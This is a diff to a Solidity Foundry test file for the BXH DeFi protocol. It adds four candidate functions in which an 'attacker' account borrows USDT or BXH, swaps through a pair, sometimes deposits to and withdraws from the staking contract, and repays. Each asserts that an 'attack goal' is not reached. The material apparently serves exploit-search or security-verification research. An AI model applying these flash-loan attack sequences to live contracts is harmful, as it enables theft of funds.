@@ -242,6 +242,83 @@ contract BXHTest is Test, BlockLoader {
         bxhstaking.deposit(0, 0);
     }
 
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        swap_pair_attacker_bxh_usdt(amt3, amt4);
+        payback_usdt_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_bxh_owner(amt0);
+        swap_pair_attacker_bxh_usdt(amt1, amt2);
+        swap_pair_attacker_usdt_bxh(amt3, amt4);
+        payback_bxh_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        withdraw_bxhstaking_bxhslp_usdt(amt4);
+        payback_usdt_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        withdraw_bxhstaking_bxhslp_usdt(amt4);
+        swap_pair_attacker_bxh_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_usdt_owner(3110000e18);
